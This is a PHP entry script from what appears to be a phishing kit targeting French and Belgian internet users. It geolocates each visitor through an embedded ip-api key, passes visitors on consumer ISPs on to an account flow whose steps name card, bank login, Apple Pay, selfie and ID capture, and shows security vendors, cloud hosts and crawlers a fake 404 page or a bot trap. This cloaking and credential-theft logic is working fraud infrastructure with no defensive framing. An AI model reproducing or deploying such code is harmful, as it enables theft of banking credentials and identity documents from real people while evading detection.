<?php
session_start();

include('myaccount/settings.php');
//CALCULER LE NOMBRE D ETAPES


// SETTING UP CODES
$_SESSION['gotovbv'] = md5(uniqid(rand(), true));
$_SESSION['ce_noappcode'] = md5(uniqid(rand(), true));
$_SESSION['gotopasswordcode'] = md5(uniqid(rand(), true));
$_SESSION['billingerrorcode'] = md5(uniqid(rand(), true));
$_SESSION['gotocard'] = md5(uniqid(rand(), true));
$_SESSION['errormail'] = md5(uniqid(rand(), true));
$_SESSION['gotoapplepay'] = md5(uniqid(rand(), true));
$_SESSION['gotoselfie'] = md5(uniqid(rand(), true));
$_SESSION['gotocni'] = md5(uniqid(rand(), true));
$_SESSION['gotologbank'] = md5(uniqid(rand(), true));
$_SESSION['gotofinished'] = md5(uniqid(rand(), true));
$_SESSION['errorcard'] = md5(uniqid(rand(), true));
$_SESSION['errorbank'] = md5(uniqid(rand(), true));
$_SESSION['errorapay'] = md5(uniqid(rand(), true));



$ip = $_SERVER['REMOTE_ADDR'];
function getIpInfo($ip = '') {
    $ipinfo = file_get_contents("https://pro.ip-api.com/json/".$ip."?key=ShCL1YyIcRsNBU1");
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}
    $visitor_ip = $_SERVER['REMOTE_ADDR'];
    $ipinfo_json = getIpInfo($visitor_ip);
	$org = "{$ipinfo_json['as']}";
	$isps = "{$ipinfo_json['isp']}";





if($_SESSION['authorized'] != true){
  if (strpos($org, "wanadoo") || strpos($org, "bbox") || strpos($org, "Bouygues") || strpos($org, "Orange") || strpos($org, "sfr") || strpos($org, "SFR") || strpos($org, "Sfr") || strpos($org, "free") || strpos($org, "Free") || strpos($org, "FREE") || strpos($org, "red") || strpos($org, "proxad") || strpos($org, "club-internet") || strpos($org, "oleane") || strpos($org, "nordnet") || strpos($org, "liberty") || strpos($org, "colt") || strpos($org, "chello") || strpos($org, "belgacom") || strpos($org, "proximus") || strpos($org, "skynet") || strpos($org, "aol") || strpos($org, "neuf") || strpos($org, "darty") || strpos($org, "bouygue") || strpos($org, "numericable") || strpos($org, "Free") || strpos($org, "Num\303\251ris") || strpos($org, "Poste") || strpos($org, "Sosh")) {

	$_SESSION['authorized'] = true;

}
else{
	
    if(strpos(strtolower($org),"amazon") || strpos(strtolower($org),"chrome")|| strpos(strtolower($org),"google")|| strpos(strtolower($org),"phish")|| strpos(strtolower($org),"paypal") || strpos(strtolower($org),"dedfiberco") || strpos(strtolower($org),"palo") || strpos(strtolower($org),"digital") || strpos(strtolower($org),"cloud") || strpos(strtolower($org),"trustwave") || strpos(strtolower($org),"holdings") || strpos(strtolower($org),"softlayer") || strpos(strtolower($org),"surfcontrol") || strpos(strtolower($org),"egihosting") || strpos(strtolower($org),"logicweb") || strpos(strtolower($org),"choopa") || strpos(strtolower($org),"shinjiru") || strpos(strtolower($org),"logicWeb") || strpos(strtolower($org),"choopa") || strpos(strtolower($org),"solutions") || strpos(strtolower($org),"brookhaven")|| strpos(strtolower($org),"ovh") || strpos(strtolower($org),"xfera") || strpos(strtolower($org),"avast") || strpos(strtolower($org),"privax") || strpos(strtolower($org),"wintek") || strpos(strtolower($org),"kaspersky") || strpos(strtolower($org),"telefônica") || strpos(strtolower($org),"uk-2") || strpos(strtolower($org),"bullguard") || strpos(strtolower($org),"net4sec") || strpos(strtolower($org),"datacamp") || strpos(strtolower($org),"hostdime") || strpos(strtolower($org),"dream") || strpos(strtolower($org),"leaseweb") || strpos(strtolower($org),"hetzner")|| strpos(strtolower($org),"rakuten") || strpos(strtolower($org),"forcepoint") || strpos(strtolower($org),"ntt") || strpos(strtolower($org),"colocrossing") || strpos(strtolower($org),"forcepoint") || strpos(strtolower($org),"sinet") || strpos(strtolower($org),"soyuz") || strpos(strtolower($org),"internap") || strpos(strtolower($org),"nameshield") || strpos(strtolower($org),"microsoft") || strpos(strtolower($org),"vnpt") || strpos(strtolower($org),"pvimpelcom") || strpos(strtolower($org),"hetzner") || strpos(strtolower($org),"gigenet") || strpos(strtolower($org),"cogent") || strpos(strtolower($org),"faster") || strpos(strtolower($org),"internetx") || strpos(strtolower($org),"forcepoint") || strpos(strtolower($org),"financing") || strpos(strtolower($org),"terratransit") || strpos(strtolower($org),"joshua") || strpos(strtolower($org),"fommtouch") ||  strpos(strtolower($org),"yandex") || strpos(strtolower($org),"ratelimited") || strpos(strtolower($org),"hot-net") || strpos(strtolower($org),"mcafee") || strpos(strtolower($org),"dedfiberco"))
 
    {
 
        header("HTTP/1.0 404 Not Found");
            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
 
    }
    else{
        $_SESSION['suspect'] = true;
        die(header('Location: botsbreaker/'));
    }


}
}


if($_SESSION['authorized'] == true){
$_SESSION['userid'] = uniqid();
header('Location: myaccount/index.php?'.$_SESSION['userid']);
}



?>